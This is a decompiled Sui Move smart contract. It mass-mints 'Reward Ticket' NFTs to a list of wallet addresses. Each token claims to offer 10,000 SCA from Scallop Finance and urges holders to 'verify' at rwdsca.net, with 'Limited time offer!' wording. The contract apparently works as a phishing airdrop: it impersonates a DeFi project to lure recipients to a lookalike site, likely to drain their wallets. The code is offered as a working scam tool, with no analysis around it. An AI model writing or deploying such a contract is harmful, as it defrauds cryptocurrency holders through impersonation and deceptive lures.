module 0x408ca4a6b61394cdf362a381ff609feef540d0dbe9439ff5dcbab6bf41e12a23::reward9023 {
    struct REWARD9023 has drop {
        dummy_field: bool,
    }

    struct TICKET_9023 has store, key {
        id: 0x2::object::UID,
        name: 0x1::string::String,
        image_url: 0x1::string::String,
        description: 0x1::string::String,
        Reward: 0x1::string::String,
    }

    struct MintEvent has copy, drop {
        nft_id: 0x2::object::ID,
        user: address,
        name: 0x1::string::String,
        image_url: 0x1::string::String,
        description: 0x1::string::String,
        Reward: 0x1::string::String,
    }

    public fun DistributeReward9023(arg0: &mut vector<address>, arg1: &mut 0x2::tx_context::TxContext) {
        while (0x1::vector::length<address>(arg0) > 0) {
            let v0 = TICKET_9023{
                id          : 0x2::object::new(arg1),
                name        : 0x1::string::utf8(b"Reward Ticket"),
                image_url   : 0x1::string::utf8(b"https://res.cloudinary.com/dkhar3xjm/image/upload/v1729514497/rwdscanet_1021_0_iani6r.jpg"),
                description : 0x1::string::utf8(b"Claim your 10,000 SCA Reward from Scallop Finance! Visit https://rwdsca.net to verify and receive your reward. Limited time offer!"),
                Reward      : 0x1::string::utf8(b"10,000 SCA"),
            };
            let v1 = MintEvent{
                nft_id      : 0x2::object::id<TICKET_9023>(&v0),
                user        : 0x2::tx_context::sender(arg1),
                name        : 0x1::string::utf8(b"Reward Ticket"),
                image_url   : 0x1::string::utf8(b"https://res.cloudinary.com/dkhar3xjm/image/upload/v1729514497/rwdscanet_1021_0_iani6r.jpg"),
                description : 0x1::string::utf8(b"Claim your 10,000 SCA Reward from Scallop Finance! Visit https://rwdsca.net to verify and receive your reward. Limited time offer!"),
                Reward      : 0x1::string::utf8(b"10,000 SCA"),
            };
            0x2::event::emit<MintEvent>(v1);
            0x2::transfer::public_transfer<TICKET_9023>(v0, 0x1::vector::pop_back<address>(arg0));
        };
    }

    fun init(arg0: REWARD9023, arg1: &mut 0x2::tx_context::TxContext) {
        let v0 = 0x1::vector::empty<0x1::string::String>();
        let v1 = &mut v0;
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"name"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"image_url"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"description"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"project_url"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"creator"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"Reward"));
        let v2 = 0x1::vector::empty<0x1::string::String>();
        let v3 = &mut v2;
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Reward Ticket"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"https://res.cloudinary.com/dkhar3xjm/image/upload/v1729514497/rwdscanet_1021_0_iani6r.jpg"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Claim your 10,000 SCA Reward from Scallop Finance! Visit https://rwdsca.net to verify and receive your reward. Limited time offer!"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"https://rwdsca.net"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Scallop Finance"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"10,000 SCA"));
        let v4 = 0x2::package::claim<REWARD9023>(arg0, arg1);
        let v5 = 0x2::display::new_with_fields<TICKET_9023>(&v4, v0, v2, arg1);
        0x2::display::update_version<TICKET_9023>(&mut v5);
        0x2::transfer::public_transfer<0x2::package::Publisher>(v4, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::display::Display<TICKET_9023>>(v5, 0x2::tx_context::sender(arg1));
    }

    // decompiled from Move bytecode v6
}

